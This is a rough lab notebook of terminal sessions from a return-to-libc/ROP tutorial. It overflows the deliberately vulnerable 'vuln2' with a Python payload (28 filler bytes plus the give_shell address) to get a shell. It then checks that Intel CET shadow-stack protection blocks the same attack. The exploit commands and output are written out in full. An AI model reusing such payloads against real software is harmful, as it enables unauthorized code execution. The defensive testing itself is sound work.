Source: https://www.youtube.com/watch?v=ruJXvxXzyU8
Source git: https://github.com/nnamon/PracticalRet2Libc

1.
root@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation# ./vuln1-nocanary-execstack  Makefile                  vuln1-execstack           vuln2                     vuln3.c
vuln1-allprots            vuln1-nocanary            vuln2.c
vuln1.c                   vuln1-nocanary-execstack  vuln3
root@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation# ./vuln1-nocanary-execstack &
[1] 18729
root@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation# cat /proc/18729/maps
08048000-08049000 r-xp 00000000 08:05 18744533                           /home/xpf/code/PracticalRet2Libc-master/src/presentation/vuln1-nocanary-execstack
08049000-0804a000 r-xp 00000000 08:05 18744533                           /home/xpf/code/PracticalRet2Libc-master/src/presentation/vuln1-nocanary-execstack
0804a000-0804b000 rwxp 00001000 08:05 18744533                           /home/xpf/code/PracticalRet2Libc-master/src/presentation/vuln1-nocanary-execstack
f7d3b000-f7f10000 r-xp 00000000 08:05 20447338                           /lib/i386-linux-gnu/libc-2.27.so
f7f10000-f7f11000 ---p 001d5000 08:05 20447338                           /lib/i386-linux-gnu/libc-2.27.so
f7f11000-f7f13000 r-xp 001d5000 08:05 20447338                           /lib/i386-linux-gnu/libc-2.27.so
f7f13000-f7f14000 rwxp 001d7000 08:05 20447338                           /lib/i386-linux-gnu/libc-2.27.so
f7f14000-f7f17000 rwxp 00000000 00:00 0
f7f37000-f7f39000 rwxp 00000000 00:00 0
f7f39000-f7f3c000 r--p 00000000 00:00 0                                  [vvar]
f7f3c000-f7f3e000 r-xp 00000000 00:00 0                                  [vdso]
f7f3e000-f7f64000 r-xp 00000000 08:05 20447277                           /lib/i386-linux-gnu/ld-2.27.so
f7f64000-f7f65000 r-xp 00025000 08:05 20447277                           /lib/i386-linux-gnu/ld-2.27.so
f7f65000-f7f66000 rwxp 00026000 08:05 20447277                           /lib/i386-linux-gnu/ld-2.27.so
ffefa000-fff1b000 rwxp 00000000 00:00 0                                  [stack]

[1]+  Stopped                 ./vuln1-nocanary-execstack


ffefa000-fff1b000 rwxp 00000000 00:00 0                                  [stack]



xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ python -c 'print "A"*28 + "BBBB"' | ./vuln2
What is the password:
Incorrect password!
Segmentation fault (core dumped)
xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$
xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ dmesg | tail -n 1
[1542228.793661] vuln2[18813]: segfault at 42424242 ip 0000000042424242 sp 00000000ffa548b0 error 14 in libc-2.27.so[f7d99000+1d5000]

sudo bash and kill it
root@xpf-desktop:~/code/PracticalRet2Libc-master/docs/lessonplans/1_practicalrop# kill -9 18729


2.  Hack by vuln2
xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ ./vuln2 &
[1] 18881
xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ What is the password:
[1]+  Stopped                 ./vuln2
xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ ps -ef | grep vuln
xpf      18881 18791  0 11:44 pts/2    00:00:00 ./vuln2
xpf      18884 18791  0 11:44 pts/2    00:00:00 grep --color=auto vuln

xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ cat /proc/18881/maps
08048000-08049000 r-xp 00000000 08:05 18744535                           /home/xpf/code/PracticalRet2Libc-master/src/presentation/vuln2
08049000-0804a000 r--p 00000000 08:05 18744535                           /home/xpf/code/PracticalRet2Libc-master/src/presentation/vuln2
0804a000-0804b000 rw-p 00001000 08:05 18744535                           /home/xpf/code/PracticalRet2Libc-master/src/presentation/vuln2
08754000-08776000 rw-p 00000000 00:00 0                                  [heap]
f7ce6000-f7ebb000 r-xp 00000000 08:05 20447338                           /lib/i386-linux-gnu/libc-2.27.so
f7ebb000-f7ebc000 ---p 001d5000 08:05 20447338                           /lib/i386-linux-gnu/libc-2.27.so
f7ebc000-f7ebe000 r--p 001d5000 08:05 20447338                           /lib/i386-linux-gnu/libc-2.27.so
f7ebe000-f7ebf000 rw-p 001d7000 08:05 20447338                           /lib/i386-linux-gnu/libc-2.27.so
f7ebf000-f7ec2000 rw-p 00000000 00:00 0
f7ee2000-f7ee4000 rw-p 00000000 00:00 0
f7ee4000-f7ee7000 r--p 00000000 00:00 0                                  [vvar]
f7ee7000-f7ee9000 r-xp 00000000 00:00 0                                  [vdso]
f7ee9000-f7f0f000 r-xp 00000000 08:05 20447277                           /lib/i386-linux-gnu/ld-2.27.so
f7f0f000-f7f10000 r--p 00025000 08:05 20447277                           /lib/i386-linux-gnu/ld-2.27.so
f7f10000-f7f11000 rw-p 00026000 08:05 20447277                           /lib/i386-linux-gnu/ld-2.27.so
ff998000-ff9b9000 rw-p 00000000 00:00 0                                  [stack]

xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ cat /proc/sys/kernel/randomize_va_space
2
# value 2 means ASLR setting is enabled. Address Space Layout Randomization (ASLR) is a memory-protection process for operating systems that guards against buffer-overflow attacks. ... ASLR is used today on Linux, Windows, and MacOS systems.

xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ python -c 'print "A"*28 + "BBBB"' | ./vuln2
What is the password:
Incorrect password!
Segmentation fault (core dumped)
# So buffer overflow attack didn't work. And get the EIP SP



xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ dmesg | tail -n 1
[1542923.009539] vuln2[18938]: segfault at 42424242 ip 0000000042424242 sp 00000000ff819880 error 14 in libc-2.27.so[f7dbc000+1d5000]

get EIP from 32bit control,  RIP

xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ objdump -d vuln2 | grep give_shell
080484cb <give_shell>:
 8048536:       e8 90 ff ff ff          call   80484cb <give_shell>

xpf@xpf-desktop:~/code/PracticalRet2Libc-master/src/presentation$ (python -c 'import struct; print "A" * 28 + struct.pack("I", 0x080484cb)'; cat -) | ./vuln2
What is the password:
Incorrect password!
ls
Makefile        vuln1.c          vuln1-nocanary            vuln2    vuln3
vuln1-allprots  vuln1-execstack  vuln1-nocanary-execstack  vuln2.c  vuln3.c


Simple way to verify:
1.  non-CET binary, when you see "Access give shell!", which means it's be hacked:
"
# ./hack2.sh 
objdump -d vuln22 | grep give_shell
080484e6 <give_shell>:
 8048588:       e8 59 ff ff ff          call   80484e6 <give_shell>
(python2 -c 'import struct; print A * 28 + struct.pack(I, 0x080484e6)'; cat -) | ./vuln22
What is the password: 
Incorrect password!
Access give shell!
ls
hack2_cet.sh  hack.sh     v3.txt          vuln1.c          vuln1-nocanary-execstack  vuln22.c   vuln2_cet_dump.txt
hack2.sh      Makefile    v4.txt          vuln1-execstack  vuln2                     vuln2.c    vuln3
hack3.sh      README.txt  vuln1-allprots  vuln1-nocanary   vuln22                    vuln2_cet  vuln3.c
"


2. CET binary, this hack will be protected by #CP "control protection" in dmesg:
"
root@p-adls01 ~/cet_test/hack/rop_hack # ./hack2_cet.sh 
objdump -d vuln2_cet | grep give_shell
080491f6 <give_shell>:
 8049279:       e8 78 ff ff ff          call   80491f6 <give_shell>
(python2 -c 'import struct; print A * 28 + struct.pack(I, 0x080491f6)'; cat -) | ./vuln2_cet
What is the password: 
Incorrect password!
ls
./hack2_cet.sh: line 6: 14728 Exit 141                ( python2 -c 'import struct; print "A" * 28 + struct.pack("I", 0x080491f6)'; cat - )
     14729 Segmentation fault      (core dumped) | ./vuln2_cet
# dmesg | tail
...
[443082.116778] traps: vuln2_cet[14729] control protection ip:8049292 sp:ff84063c ssp:f7f53ff4 error:1(near-ret) in vuln2_cet[8049000+1000]
"

